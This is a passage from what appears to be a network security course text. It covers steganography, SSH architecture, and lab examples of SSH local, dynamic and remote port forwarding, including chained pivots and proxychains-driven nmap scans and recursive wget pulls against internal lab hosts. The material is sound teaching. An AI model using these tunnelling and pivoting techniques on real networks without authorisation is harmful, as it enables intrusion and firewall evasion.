  - This works by adding the message into the comment sections, white spaces, or additional HTML tags of the host file.
  - Popular files used are:
    - Image files: BMP, PNG, JPEG, TIFF, and GIF
    - Audio files: WAV, AU, and MP3
- Substitution - Replaces what is viewed as an insignificant part of the cover file, but also must survive when processed by any "native" application. Can result in degradation such as aberrations in video or still images, audible noise in sound files or in the case of executables, processing errors or abends.
  - This is the most common method used.
  - Commonly be done by modifying the [image pixel colors](https://www.w3schools.com/Colors/colors_rgb.asp) to a color shade brighter or darker than the original.
  - This is done by using the Least Significant Bit (LSB) method.
  - An original byte such as 10000000 can be changed to 10000001.
- Propagation - Using special software to generate a new file. Utilizes a generation engine which when fed the payload produces an output file.
  - This generally requires a tool of some sort to automatically generate the file.
  - Possible tools:
    - StegSecret (http://stegsecret.sourceforge.net/)
    - HyDEn (https://www.hindawi.com/journals/bmri/2013/634832/)
    - Spammimic (https://www.spammimic.com/)
      - = similar to steganography but hides messages in spam emails. (yes, people still click the link)

![image](https://github.com/ruppertaj/WOBC/assets/93789685/2eff4419-8dd6-4b0c-b988-4e55534b0043)

Detecting Steganography

Security analysts work to identify the tactics, techniques and procedures (TTPs) of attackers and pen testers. Over the years, they have identified typical signatures that steganographic applications use. This is why antivirus applications, for example, can identify typical moves made by steganographic applications.

However, a networking method of detective possible Steganographic changes might be in locating a man-in-the-middle attack. If someone manages to intercept the communication between two machines, they could modify it with steganography and go unnoticed.

Therefore, pen testers and attackers morph and modify their procedures to thwart detection. And so the “cat and mouse” game continues: attackers constantly modify tools and techniques, and security analysts constantly look for new signatures and methods.

References:  
https://www.edureka.co/blog/steganography-tutorial  
https://www.iana.org/assignments/icmp-parameters/icmp-parameters.xhtml  
https://www.ukessays.com/essays/computer-science/steganography-uses-methods-tools-3250.php  
https://www.mdpi.com/2076-3417/11/4/1641/pdf  
http://www.jucs.org/jucs_25_11/detection_of_size_modulation  
https://sansorg.egnyte.com/dl/AIvwIqnhxm/?  
https://www.w3schools.com/Colors/colors_rgb.asp


---
## 4.4 Secure Shell (SSH)
https://www.ssh.com/academy/ssh

4.4.1 SSH Basics
RFCs 4250, 4251, 4252, 4253, 4254, 4255, 4256, 4335, 4344, 4345, 4419, 4432, 4462, 4716, 4819, 5592, 5647, 5656, 6187, 6239, 6242, 6594, 6668, 7479, 8268, 9308, 8332

https://www.omnisecu.com/tcpip/important-rfc-related-with-ssh.php

SSH Protocol
SSH is an open protocol with many different implementations. Examples include PuTTy, Solaris Secure Shell, Bitvise, and OpenSSH. OpenSSH is the open source implementation that is most common and the focus of this course as it is widely found in Linux and Unix. Support for Windows was introduced when OpenSSH was ported to run in Windows Power Shell in 2015. It is included in Windows 10 as of 2018, though it must be enabled in settings.

History of the protocol and implementations:

SSH was developed in 1995 after a password sniffing attack occurred at the University of Technology in Finland. A researcher at the university created SSH1 for himself, which rapidly gained popularity with over 20,000 users by the end of 1995. The creator also founded the SSH Communications Security Corp (SCS) to maintain and develop SSH. That same year, an IETF was drafted describing operation of the SSH1 software and assigned a working group (SECSH). The group submitted a draft for SSH-2.0 in February 1997 which was then released by SCS as a software product with a restrictive license. Due to restrictions many people continued to use SSH1 until OpenSSH was released. OpenSSH came from the OpenBSD project and is based on the last free release of SSH, 1.2.12, but due to the open source community it has been updated regularly and ported to many platforms.


---
### 4.4.2 Components of SSH Architecture
In order for ssh to work properly between a client and server, several components are required:

- Server
Known as sshd in most linux SSH implementations, this allows incoming SSH connections and handles authentication and authorization.

- Clients
This is the program that connects to the SSH server for a request, examples include scp and ssh

- Sessions
The client and server conversation that begins after successful mutual authentication.

- Keys
There are several keys that are used in SSH:
  - User Key - Asymmetric Public key created used to identify the user to a server (generated by the user)
  - Host Key - Asymmetric Public key created to identify a server to a user (generated by an administrator)
  - Session Key - Symmetric Key created by the client and the server that protects the communication for a particular session

- Key Generator
Creates user keys and host keys via ssh-keygen

- Known-hosts database
Collection of host keys that the client and server refer to for mutual authentication.

- Agent
Stores keys in memory as a convenience for users to not input pass-phrases repetitively.

- Signer
This is a program that signs the hostbased authentication packets.

- Random Seed
Random data used for entropy in creating pseudo-random numbers

- Configuration File
Settings that exist on either the client or server that dictate functionality for ssh or sshd respectively

![image](https://github.com/ruppertaj/WOBC/assets/93789685/624a21b7-0926-44f5-a763-7e057b2cb06c)

Defined in [RFC4251](https://tools.ietf.org/html/rfc4251), there are three major protocols are run on top of TCP to facilitate an SSH Connection:

---
**SSH Protocol Components**

- SSH-TRANS
This can be thought of as the building block that provides initial connection, server authentication, basic encryption, integrity services, and compression if needed. Once this is established, a client has a secure full duplex stream to an authenticated remote peer.

- SSH-USERAUTH
This component is sent over the SSH-TRANS connection and used to authenticate with the client with the server. During this stage the client learns about format of authentication requests, conditions, and available methods of authentication. SSH uses algorithms in compliance with DSS defined in [FIPS PUB 186-4](https://nvlpubs.nist.gov/nistpubs/fips/nist.fips.186-4.pdf). (RSA, DSA, etc.) Most commonly this will be RSA.

- SSH-CONNECT
This component provides the exciting things over a single pipe that is provided by SSH-TRANS. It includes support for multiple interactive and non-interactive sessions. It multiplexes several channels through the underlying connections to allow for TCP, X, and agent forwarding, terminal handling, remote program execution.

![image](https://github.com/ruppertaj/WOBC/assets/93789685/c8c76408-0824-4254-99c8-ec9938d6d670)


---
**Authentication**

*How does SSH authenticate a user?*

There are several methods used by SSH for authentication, the following are the most common implementations:

- Password Authentication:
This is performed with help from the host operating system, which maintains the user and password association. The password must be transmitted to the remote server during authentication. This is the traditional way SSH works in most situations.

- Cryptographic Key Authentication:
This is performed using the "ssh-keygen" command to generate a public and private key pair. The public key must be installed on the SSH server, while the private key remains on the host machine. It is extremely important to create a pass-phrase when prompted during the key generation process. If this is not performed and the key is stolen, credentials are compromised and anyone can perform actions on behalf of the owner of the key.


---
## 4.5 Port Forwarding
Port forwarding

Port forwarding is a mechanism in SSH that allows the tunneling of an application port from a client machine to a server. This can also be done in the reverse order. SSH port forwarding is often used to add encryption to legacy applications, provide access to internal network service, and to bypass firewall restrictions. Though port forwarding has legitimate uses, it can also be abused by attackers if not monitored, incorrectly configured, or if poor key management policies are in place. Attackers can use port forwarding through tunnels as a means of data ex-filtration and to hide their tracks by bouncing off several random devices through encrypted tunnels. Akamai has documented the use of IoT devices that are used for this very purpose.

- Syntax - SSH port forwarding is broken up into 4 distinct parts.
  - The `ssh` command. The command must come first so the system can then expect what comes after.
  - The ssh authentication - this must come after the `ssh` command, but can come before or after the socket creation.
    - This is the vital piece of the ssh port forwarding.
    - Authentication to the remote host is what authorizes the connection and the port forward.
    - The typical syntax is `username@ip_address`.
    - If the username is not specified then the current logged in username is assumed.
    - The `-p` can be used to specify an alternate port to be used. When used, it can be specified immediately before or immediately after the ssh authentication.
  - The socket creation - this must come after the `ssh` command, but can come before or after the ssh authentication.
    - This part is vital is the creation of the listener port mapped to the target IP and port.
    - Consists of 2 main parts.
      - The first is the -L or -R. The -L for Local-port-forwarding or the -R for Remote-port-forwarding.
        - The -L is used when we want to create the listener port on the client (local system) mapped to a target IP and port via the server.
        - The -R is used when we want to create the listener port on a server (remote system) mapped to a target IP and port via the client (local system).
      - The second is the bind of the listener IP and port to the target IP and port. `<listener ip>:<listener bind port>:<target ip>:<target port>`.
        - `<listener ip>` - This is optional. If not specified then 127.0.0.1 is assumed. 0.0.0.0 or any other configured IP on the system can be specified. When using 0.0.0.0, this will make the listening port a gateway forwarding port. This means the port can be targeted like a service port by any remote system. Gateway forwarding must be enabled in the /etc/ssh/sshd_config file to make the listening port a gateway forwarding port.
        - `<listener bind port>` - This is mandatory. A port (typically above 1023) is specified as the listener port for this connection.
        - `<target ip>` - This is mandatory. The IP address of the target that is accessible from the pivot.
        - `<target port>` - This is mandatory. The port on the target that is accessible from the pivot.
    - Optionally we can create a Dynamic tunnel using -D.
      - The -D creates a port on the client (local system) and sets up a SOCKS4 proxy tunnel where the target ip:port can be specified dynamically via the server (remote system).
      - The port created can be any ephemeral port but typically we use port 9050 which is used with The Onion Router ([TOR](https://www.torproject.org/)).
    - The options. These are not required but can be used.
      - `N` - Do not execute a remote command. This is useful for just forwarding ports. This is typically used in conjunction with the T option.
      - `T` - Disable pseudo-terminal allocation. This will prevent the creation of a remote shell. This is typically used in conjunction with the N option.
      - `X` - Allows for X11 forwarding. Typically used with typical ssh remote connections. Not typically used with ssh port forwarding.
      - `v` - Verbose mode. Causes ssh to print debugging messages about its progress. Can be used to troubleshoot an ssh connection. Not used for any typical remote ssh connection or ssh port forward.
      - `f` - Requests ssh to go to background just before command execution. When used the ssh will request the authenticating password then background. This is not to be confused with the & used with typical process backgrounding.



References:  
https://www.ssh.com/academy/ssh/tunneling-example  
https://linuxize.com/post/how-to-setup-ssh-tunneling/  
https://www.digitalocean.com/community/tutorials/how-to-set-up-ssh-tunneling-on-a-vps  
https://www.torproject.org/  


---
### 4.5.1 Local Port Forwarding
Local Forwarding

Local port forwarding is used to forward a port on a client’s machine to a server machine. An SSH client allocates a local socket to listen for connections, once a connection is received, a secure tunnel is established. The server is then forwarded to the destination and port established in the port forward command issued by the client.

[Syntax:](https://miro.com/app/board/o9J_klSqCSY=/?moveToWidget=3458764561528602623&cot=10)
```
$ ssh <username>@<pivot IP> -L <local bind port>:<target IP>:<target port> -NT
|__________________________||____________________________________________||_____|
          |                                       |                          |
   ssh authentication                     local port forward               options
```

This command performs the following:

- `ssh`: This initiates an SSH connection from the client (localhost) to a remote server.
- `<username>`: Replace this with the username you have access to on the remote server (pivot machine).
- `<pivot IP>`: Replace this with the IP address of the remote server you’re connecting to.
- `-L <local bind port>:<target IP>:<target port>`: This flag (-L) specifies a local port forwarding configuration. Here’s what each part within this section does:
- `<local bind port>`: Created on your local machine that will be used to access the forwarded service. You can choose any unused port number here (commonly used ports are above 1024). This port will be mapped to 127.0.0.1 (localhost) on the client.
- `<target IP>`: This is the IP address of the target machine you want to ultimately connect to. This machine might be located behind the pivot machine (server) and not directly accessible from your local machine. The target can be the server itself by targeting 127.0.0.1 (localhost).
- `<target port>`: This is the port number of the service running on the target machine that you want to access. The port can also be on the server machine. This can be any TCP port.
- `-N`: This flag tells SSH not to execute any remote commands after the tunnel is established. It keeps the SSH connection open solely for maintaining the tunnel.
- `-T`: This flag disables pseudo-terminal allocation. This means no interactive shell session will be opened on the remote server.

This syntax can also be written as this:
```
$ ssh -L <local bind port>:<target IP>:<target port> <username>@<pivot IP> -NT
|__________________________________________________||____________________||_____|
                      |                                      |               |
               local port forward                    ssh authentication   options
```


---
#### 4.5.1.1 Local Port Forward to localhost of server
Local port forwarding to the localhost of a server allows you to establish a secure communication channel between a local client and a service running on the server’s localhost (127.0.0.1). This can be useful for accessing services or resources that are only available on the server itself, such as SSH, Telnet, or a web server running locally.

![image](https://github.com/ruppertaj/WOBC/assets/93789685/8ad33138-041f-4de4-b715-572c8ceea5a9)

- Creates 1122 on the Internet_Host mapped to the localhost port 22 of Blue_DMZ_Host-1.
```
$ ssh student@172.16.1.15 -L 1122:localhost:22 -NT
or
$ ssh -L 1122:localhost:22 student@172.16.1.15 -NT
```
The command performs the following:
- The Internet_Host (client) authenticates to the server (remote host 172.16.1.15) with student’s credentials.
- Establishes a local port bind (1122) on the client (Internet_Host) the command is issued from.
- Port forwards to the localhost (127.0.0.1) of the server (172.16.1.15) on port 22.
- Sets options for no terminal prompt.

Now all traffic that goes to socket 127.0.0.1:1122 on the local machine (Internet_Host) will be sent to localhost:22 on 172.16.1.15.
```
$ ssh student@localhost -p 1122
Blue_DMZ_Host-1~$
```
---

![image](https://github.com/ruppertaj/WOBC/assets/93789685/1e023423-edd4-4f46-bc5f-6e81379ef4ab)

- Creates 1123 on the Internet_Host mapped to the localhost port 23 of Blue_DMZ_Host-1.
```
$ ssh student@172.16.1.15 -L 1123:localhost:23 -NT
or
$ ssh -L 1123:localhost:23 student@172.16.1.15 -NT
```
The command performs the following:
- The Internet_Host (client) authenticates to the server (remote host 172.16.1.15) with student’s credentials.
- Establishes a local port bind (1123) on the client (Internet_Host) the command is issued from.
- Port forwards to the localhost (127.0.0.1) of the server (172.16.1.15) on port 23.
- Sets options for no terminal prompt.

Now all traffic that goes to socket 127.0.0.1:1123 on the local machine (Internet_Host) will be sent to localhost:23 on 172.16.1.15.
```
$ telnet localhost 1123
Blue_DMZ_Host-1~$
```
---

![image](https://github.com/ruppertaj/WOBC/assets/93789685/569c5ce1-1882-468c-8d2c-adc9fb96a616)

- Creates 1180 on the Internet_Host mapped to the localhost port 80 of Blue_DMZ_Host-1.
```
$ ssh student@172.16.1.15 -L 1180:localhost:80 -NT
or
$ ssh -L 1180:localhost:80 student@172.16.1.15 -NT
```
The command performs the following:
- The Internet_Host (client) authenticates to the server (remote host 172.16.1.15) with student’s credentials.
- Establishes a local port bind (1180) on the client (Internet_Host) the command is issued from.
- Port forwards to the localhost (127.0.0.1) of the server (172.16.1.15) on port 80.
- Sets options for no terminal prompt.

Now all traffic that goes to socket 127.0.0.1:1180 on the local machine (Internet_Host) will be sent to localhost:80 on 172.16.1.15.
```
$ firefox http://localhost:1180
{Webpage of Blue_DMZ_Host-1}
```

---
#### 4.5.1.2 Local Port Forward to remote target via server
Local port forwarding to a remote target via a server allows you to establish a secure communication channel between a local client and a service running on a remote target accessible via the server. This can be useful for accessing resources or services that are not directly accessible from your local machine but can be reached through an intermediate server.

![image](https://github.com/ruppertaj/WOBC/assets/93789685/05fc8300-6f24-41d0-8e4a-5a0c6ccb6b68)

- Creates 2222 on the Internet_Host mapped to port 22 of Blue_INT_DMZ_Host-1 (172.16.40.10) via the server Blue_DMZ_Host-1 (172.16.1.15).
```
$ ssh student@172.16.1.15 -L 2222:172.16.40.10:22 -NT
or
$ ssh -L 2222:172.16.40.10:22 student@172.16.1.15 -NT
```
The command performs the following:
- The Internet_Host (client) authenticates to the server (remote host 172.16.1.15) with student’s credentials.
- Establishes a local port bind (2222) on the client (Internet_Host) the command is issued from.
- Port forwards to the the target 172.16.40.10 on port 22.
- Sets options for no terminal prompt.

Now all traffic that goes to socket 127.0.0.1:2222 on the local machine (Internet_Host) will be sent to 172.16.40.10:22.
```
$ ssh student@localhost -p 2222
Blue_INT_DMZ_Host-1~$
```
---

![image](https://github.com/ruppertaj/WOBC/assets/93789685/6cd71c13-5cb5-49e4-b190-fe3c28cc0581)

- Creates 2223 on the Internet_Host mapped to port 23 of Blue_INT_DMZ_Host-1 (172.16.40.10) via the server Blue_DMZ_Host-1 (172.16.1.15).
```
$ ssh student@172.16.1.15 -L 2223:172.16.40.10:23 -NT
or
$ ssh -L 2223:172.16.40.10:23 student@172.16.1.15 -NT
```
The command performs the following:
- The Internet_Host (client) authenticates to the server (remote host 172.16.1.15) with student’s credentials.
- Establishes a local port bind (2223) on the client (Internet_Host) the command is issued from.
- Port forwards to the the target 172.16.40.10 on port 23.
- Sets options for no terminal prompt.

Now all traffic that goes to socket 127.0.0.1:2223 on the local machine (Internet_Host) will be sent to 172.16.40.10:23.
```
$ telnet localhost 2223
Blue_INT_DMZ_Host-1~$
```
---

![image](https://github.com/ruppertaj/WOBC/assets/93789685/b877697f-9750-4d48-8e5e-d60be75f56af)

- Creates 2280 on the Internet_Host mapped to port 80 of Blue_INT_DMZ_Host-1 (172.16.40.10) via the server Blue_DMZ_Host-1 (172.16.1.15).
```
$ ssh student@172.16.1.15 -L 2280:172.16.40.10:80 -NT
or
$ ssh -L 2280:172.16.40.10:80 student@172.16.1.15 -NT
```
The command performs the following:
- The Internet_Host (client) authenticates to the server (remote host 172.16.1.15) with student’s credentials.
- Establishes a local port bind (2280) on the client (Internet_Host) the command is issued from.
- Port forwards to the the target 172.16.40.10 on port 80.
- Sets options for no terminal prompt.

Now all traffic that goes to socket 127.0.0.1:2280 on the local machine (Internet_Host) will be sent to 172.16.40.10:80.
```
$ firefox http://localhost:2280
{Webpage of Blue_INT_DMZ_Host-1}
```

---
#### 4.5.1.3 Local Port Forward through a previously established port forward to extend a tunnel
To extend a tunnel by forwarding a local port through a previously established port forward, you can leverage SSH’s ability to create multiple layers of port forwarding. This method allows you to create a nested or chained set of SSH tunnels, enabling you to access services on remote hosts that are not directly reachable from your local machine.

![image](https://github.com/ruppertaj/WOBC/assets/93789685/3babb45f-cb06-4339-9152-9d42e213d0d4)

- Creates 2222 on the Internet_Host mapped to port 22 of Blue_INT_DMZ_Host-1 (172.16.40.10) via the server Blue_DMZ_Host-1 (172.16.1.15).
```
$ ssh student@172.16.1.15 -L 2222:172.16.40.10:22 -NT
or
$ ssh -L 2222:172.16.40.10:22 student@172.16.1.15 -NT
```
The command performs the following:
- The Internet_Host (client) authenticates to the server (remote host 172.16.1.15) with student’s credentials.
- Establishes a local port bind (2222) on the client (Internet_Host) the command is issued from.
- Port forwards to the the target 172.16.40.10 on port 22.
- Sets options for no terminal prompt.

Now all traffic that goes to socket 127.0.0.1:2222 on the local machine (Internet_Host) will be sent to 172.16.40.10:22.
---
- We will now use this previous tunnel to establish another tunnel through it.
  - We will authenticate to the remote host 172.16.40.10 through the tunnel by calling localhost -p 2222.

![image](https://github.com/ruppertaj/WOBC/assets/93789685/51ccec4c-6a0c-4f77-8e7a-fbd5595fe86d)

- Creates 3322 on the Internet_Host mapped to port 22 of Blue_Host-1 (172.16.82.106) via the server Blue_INT_DMZ_Host-1 (127.0.0.1:2222)
```
$ ssh student@localhost -p 2222 -L 3322:172.16.82.106:22 -NT
$ ssh student@localhost -p 3322
Blue_Host-1~$
```

![image](https://github.com/ruppertaj/WOBC/assets/93789685/7644bc08-0db0-4287-9ba9-853f4157ef15)

- Creates 3323 on the Internet_Host mapped to port 23 of Blue_Host-1 (172.16.82.106) via the server Blue_INT_DMZ_Host-1 (127.0.0.1:2222)
```
$ ssh student@localhost -p 2222 -L 3323:172.16.82.106:23 -NT
$ telnet localhost 3323
Blue_Host-1~$
```

![image](https://github.com/ruppertaj/WOBC/assets/93789685/136cf7a8-1b2e-4383-8de7-1fb264513c36)

- Creates 3380 on the Internet_Host mapped to port 80 of Blue_Host-1 (172.16.82.106) via the server Blue_INT_DMZ_Host-1 (127.0.0.1:2222)
```
$ ssh student@localhost -p 2222 -L 3380:172.16.82.106:80 -NT
$ firefox http://localhost:3380
{Webpage of Blue_Host-1}
```


---
### 4.5.2 Dynamic Port Forwarding
Dynamic Port Forwarding
Dynamic port forwarding provides the ability to dynamically set up and tear down connections via a proxy to a specified port. This is extremely useful for performing actions on a remote network through tunnels and port forwards that have been previously established. Doing this allows the tools on a client to interact with hosts and services on a remote network dynamically.

Dynamic port forwarding is a feature of SSH that allows you to create a SOCKS proxy server on your local machine. This proxy server forwards traffic through an encrypted SSH connection to a remote SSH server, which then forwards the traffic to its destination on the internet. It’s particularly useful for securely tunneling your internet traffic through an SSH connection, bypassing network restrictions, and enhancing privacy and security.

- Dynamic Port Forwarding Uses
Dynamic port forwarding provides the ability to dynamically set up and tear down connections via a proxy to a specified port. This is extremely useful for performing actions on a remote network through tunnels and port forwards that have been previously established. Doing this allows the tools on a client to interact with hosts and services on a remote network dynamically.

- How does Dynamic Port Forwarding work?
Dynamic port forwarding works by allocating a socket to listen to a port on the local side, optionally bound to the specified bind_address. Whenever a connection is made to this port, the connection is forwarded over the secure channel, and the application protocol is then used to determine where to connect to from the remote machine. Currently the SOCKS4 and SOCKS5 protocols are supported, and ssh will act as a SOCKS server
```
$ ssh <user>@<IP address> -D 9050 -NT
|_______________________||______||__|
          |                 |      |
  ssh authentication     dynamic  options
```
or
```
$ ssh -D 9050 <user>@<IP address> -NT
|____________||_________________||__|
        |            |            |
     dynamic  ssh authentication options
```

The above command performs the following:
- `ssh`: Initiates an SSH connection from the client (localhost) to a remote server.
- `<username>`: Replace this with the username you have access to on the remote server (pivot machine).
- `<IP address>`: Replace this with the IP address of the remote server you’re connecting to.
- `-D 9050`: This flag (-D) specifies a dynamic port forwarding configuration for a SOCKS proxy.
- `9050`: This is the port number on the remote server that will be used by the SOCKS proxy which is the port used by the tool proxychains. You can choose any unused port number here, but commonly used ports for SOCKS proxies are between 1024 and 49151.
- `-N`: This flag tells SSH not to execute any remote commands after the tunnel is established. It keeps the SSH connection open solely for maintaining the tunnel.
- `-T`: This flag disables pseudo-terminal allocation. This means no interactive shell session will be opened on the remote server.


---
#### 4.5.2.1 Dynamic Port Forwarding to server

![image](https://github.com/ruppertaj/WOBC/assets/93789685/d3ed277f-4e7e-4101-8812-2fcb13baed34)

Dynamic Port Forwarding example:
```
$ ssh student@172.16.1.15 -D 9050 -NT
or
$ ssh -D 9050 student@172.16.1.15 -NT
```

The above command performs the the following:
> - Sends authentication credentials of student to the SSH port of 172.16.1.15. 
> - Opens up a Dynamic Port Forward with port 9050 (enabling the next command to us the proxychains tool). 
> - Sets options for no terminal prompt.
- With this extablished tunnel mapped to port 9050 on the Internet_Host mapped to the SSH port on the server Blue_DMZ_Host-1 (172.16.1.15).
- We do not need specify a target IP or port.
- With dynamic tunnels we can pick any IP and TCP port accessible from the server Blue_DMZ_Host-1 (172.16.1.15).
- We choose port 9050 because this is the default port for the proxifying tool called proxychains.
  - ProxyChains is a tool used for proxying network connections through intermediary servers. It allows you to route TCP and DNS traffic through a series of proxy servers, enabling you to hide your identity, bypass firewalls, and access resources that may be restricted by network policies.
```
$ proxychains ./scan.sh
$ proxychains nmap -Pn -sT 172.16.40.0/27 -p 21-23,80
$ proxychains ssh student@172.16.40.10
$ proxychains telnet 172.16.40.10
$ proxychains wget -r http://172.16.40.10
$ proxychains wget -r ftp://172.16.40.10
```

References:  
http://proxychains.net/  
https://github.com/haad/proxychains


---
#### 4.5.2.2 Dynamic Port Forwarding through a previously established port forward
Dynamic port forwarding through a previously established port forward involves creating a nested SSH tunnel to extend the reach of dynamic port forwarding to a remote target accessible through an intermediate server. This approach allows you to securely tunnel your internet traffic through multiple layers of SSH tunnels.

Create a Dynamic Port Forward through an already established Local Port Forward:

![image](https://github.com/ruppertaj/WOBC/assets/93789685/e30ce20d-653b-4932-8112-dbb99836cb4e)

- Creates 2222 on the Internet_Host mapped to port 22 of Blue_INT_DMZ_Host-1 (172.16.40.10) via the server Blue_DMZ_Host-1 (172.16.1.15).
```
$ ssh student@172.16.1.15 -L 2222:172.16.40.10:22 -NT
or
$ ssh -L 2222:172.16.40.10:22 student@172.16.1.15 -NT
```
Create the Dynamic Port Forward by authenticating through the port 2222 we just created.
```
$ ssh student@localhost -p 2222 -D 9050 -NT
or
$ ssh -D 9050 student@localhost -p 2222 -NT
```
The above command does the following:
- Authenticates to Blue_INT_DMZ_Host-1 (172.16.40.10) by calling the local port 2222 we establish from the SSH tunnel from prior.
- Opens up a Dynamic Port Forward with port 9050 (Be sure to close out any other dynamic tunnels using port 9050 first).
- Sets options for verbosity and no terminal prompt.
```
$ proxychains ./scan.sh
$ proxychains nmap -Pn -sT 172.16.82.96/27 -p 21-23,80
$ proxychains ssh student@172.16.82.106
$ proxychains telnet 172.16.82.106
$ proxychains wget -r http://172.16.82.106
$ proxychains wget -r ftp://172.16.82.106
```


---
### 4.5.3 Remote Port Forwarding
Remote port forwarding is a feature of SSH that allows you to securely expose a port on a remote server and forward incoming connections to that port to a local machine or another remote machine via the client that issued the command. This is useful for accessing services running on your local machine from a remote server or for providing access to services on a remote machine from your local network.

Remote port forwarding is used to give access to a client’s machine from the point of view of the writer of the command. Remote port forwarding will open up a port on the remote machine and forward all traffic from that designated port through the pivot point of where the command was written.

Syntax:
```
$ ssh <user>@<remote IP> -R <RHP>:<target IP>:<target port> -NT
|_______________________||________________________________||___|
          |                             |                    |
  ssh authentication          remote port forward         options
```
or
```
$ ssh -R <RHP>:<target IP>:<target port> <user>@<remote IP> -NT
|______________________________________||__________________||___|
              |                                 |             |
      remote port forward                ssh authentication options
```
The above command performs the following:
- `ssh`: This initiates an SSH connection from the client (localhost) to a remote server.
- `<username>`: Replace this with the username you have access to on the remote server (pivot machine).
- `<pivot IP>`: Replace this with the IP address of the remote server you’re connecting to.
- `-R` <local bind port>:<target IP>:<target port>: This flag (-R) specifies a remote port forwarding configuration. Here’s what each part within this section does:
- `<local bind port>`: Created on the remote server, this becomes the port that will be used to access the forwarded service. This port should not be in use by any other service on the pivot machine. This port will be mapped to 127.0.0.1 (localhost) on the server.
- `<target IP>`: This is the IP address of the target machine you want to ultimately give access to. This can also be the system that you are on by using 127.0.0.1 (localhost) or a machine that is accessible from your local machine but not from the remote server where you created the port.
- `<target port>`: This is the port number on target machine you want to ultimately give access to. The port can also be on on your local machine. This can be any TCP port.
- `-N`: This flag tells SSH not to execute any remote commands after the tunnel is established. It keeps the SSH connection open solely for maintaining the tunnel.
- `-T`: This flag disables pseudo-terminal allocation. This means no interactive shell session will be opened on the remote server.


---
#### 4.5.3.1 Remote Port Forwarding from localhost of client
Remote port forwarding from the localhost of the client involves forwarding a port from the client’s localhost to a remote server. This allows incoming connections to the specified port on the client’s localhost to be forwarded to a port on the remote server, enabling access to services running on the client’s machine from the remote server.

![image](https://github.com/ruppertaj/WOBC/assets/93789685/cef97f04-7ae4-42df-83c1-a1c6bcdce982)

- Creates 4422 on the Internet_Host mapped to the localhost port 22 of Blue_DMZ_Host-1.
```
Blue_DMZ_Host-1~$ ssh student@10.10.0.40 -R 4422:localhost:22 -NT
or
Blue_DMZ_Host-1~$ ssh -R 4422:localhost:22 student@10.10.0.40 -NT
```
The above command performs the following:
- The Blue_DMZ_Host-1 (client) authenticates to the server (remote host 10.10.0.40) with student’s credentials.
- Establishes a local port bind (4422) on the server (Internet_Host).
- On the Internet_Host port 127.0.0.1:4422 forwards to the localhost (127.0.0.1) of the client (172.16.1.15) on port 22.
- Sets options for no terminal prompt.

Now all traffic that goes to socket 127.0.0.1:4422 on the local machine (Internet_Host) will be sent to localhost:22 on 172.16.1.15.
```
$ ssh student@localhost -p 4422
Blue_DMZ_Host-1~$
```
---

![image](https://github.com/ruppertaj/WOBC/assets/93789685/aa063343-aec0-4d58-818f-1055eeb03fad)

- Creates 4423 on the Internet_Host mapped to the localhost port 23 of Blue_DMZ_Host-1.
```
Blue_DMZ_Host-1~$ ssh student@10.10.0.40 -R 4423:localhost:23 -NT
or
Blue_DMZ_Host-1~$ ssh -R 4423:localhost:23 student@10.10.0.40 -NT
```
The above command performs the following:
- The Blue_DMZ_Host-1 (client) authenticates to the server (remote host 10.10.0.40) with student’s credentials.
- Establishes a local port bind (4423) on the server (Internet_Host).
- On the Internet_Host port 127.0.0.1:4423 forwards to the localhost (127.0.0.1) of the client (172.16.1.15) on port 23.
- Sets options for no terminal prompt.

Now all traffic that goes to socket 127.0.0.1:4423 on the local machine (Internet_Host) will be sent to localhost:23 on 172.16.1.15.
```
$ telnet localhost 4423
Blue_DMZ_Host-1~$
```
---

![image](https://github.com/ruppertaj/WOBC/assets/93789685/80100fa7-9a87-44a5-a40b-9ba7aec6468b)

- Creates 4480 on the Internet_Host mapped to the localhost port 80 of Blue_DMZ_Host-1.
```
Blue_DMZ_Host-1~$ ssh student@10.10.0.40 -R 4480:localhost:80 -NT
or
Blue_DMZ_Host-1~$ ssh -R 4480:localhost:80 student@10.10.0.40 -NT
```
The above command performs the following:
- The Blue_DMZ_Host-1 (client) authenticates to the server (remote host 10.10.0.40) with student’s credentials.
- Establishes a local port bind (4480) on the server (Internet_Host).
- On the Internet_Host port 127.0.0.1:4480 forwards to the localhost (127.0.0.1) of the client (172.16.1.15) on port 80.
- Sets options for no terminal prompt.

Now all traffic that goes to socket 127.0.0.1:4480 on the local machine (Internet_Host) will be sent to localhost:80 on 172.16.1.15.
```
$ firefox http://localhost:4480
{Webpage of Blue_DMZ_Host-1}
```

---
#### 4.5.3.2 Remote Port Forwarding to remote target via client
Remote port forwarding to a remote target via a client involves forwarding a port from a remote server to another remote machine. This setup allows incoming connections to the specified port on the remote server to be forwarded to a port on the remote target machine, enabling access to services running on the remote target from the remote server.

Remote port forwarding from the localhost of the client involves forwarding a port from the client’s localhost to a remote server. This allows incoming connections to the specified port on the client’s localhost to be forwarded to a port on the remote server, enabling access to services running on the client’s machine from the remote server.

![image](https://github.com/ruppertaj/WOBC/assets/93789685/eb6820a2-dd38-4237-920b-1f437dd1cf4d)

- Creates 5522 on the Internet_Host mapped to port 22 of Blue_INT_DMZ_Host-1.
```
Blue_DMZ_Host-1~$ ssh student@10.10.0.40 -R 5522:172.16.40.10:22 -NT
or
Blue_DMZ_Host-1~$ ssh -R 5522:172.16.40.10:22 student@10.10.0.40 -NT
```
The above command performs the following:
- The Blue_DMZ_Host-1 (client) authenticates to the server (remote host 10.10.0.40) with student’s credentials.
- Establishes a local port bind (5522) on the server (Internet_Host).
- On the Internet_Host port 127.0.0.1:5522 forwards to the target 172.16.40.10:22 via the client 172.16.1.15.
- Sets options for no terminal prompt.

Now all traffic that goes to socket 127.0.0.1:5522 on the local machine (Internet_Host) will be sent to 172.16.40.10:22.
```
$ ssh student@localhost -p 5522
Blue_INT_DMZ_Host-1~$
```
---

![image](https://github.com/ruppertaj/WOBC/assets/93789685/cc2200ff-108b-4355-b796-5fa86bd17b29)

- Creates 5523 on the Internet_Host mapped to port 23 of Blue_INT_DMZ_Host-1.
```
Blue_DMZ_Host-1~$ ssh student@10.10.0.40 -R 5523:172.16.40.10:23 -NT
or
Blue_DMZ_Host-1~$ ssh -R 5523:172.16.40.10:23 student@10.10.0.40 -NT
```
The above command performs the following:
- The Blue_DMZ_Host-1 (client) authenticates to the server (remote host 10.10.0.40) with student’s credentials.
- Establishes a local port bind (5523) on the server (Internet_Host).
- On the Internet_Host port 127.0.0.1:5523 forwards to the target 172.16.40.10:23 via the client 172.16.1.15.
- Sets options for no terminal prompt.

Now all traffic that goes to socket 127.0.0.1:5523 on the local machine (Internet_Host) will be sent to 172.16.40.10:23.
```
$ telnet localhost 5523
Blue_INT_DMZ_Host-1~$
```
---

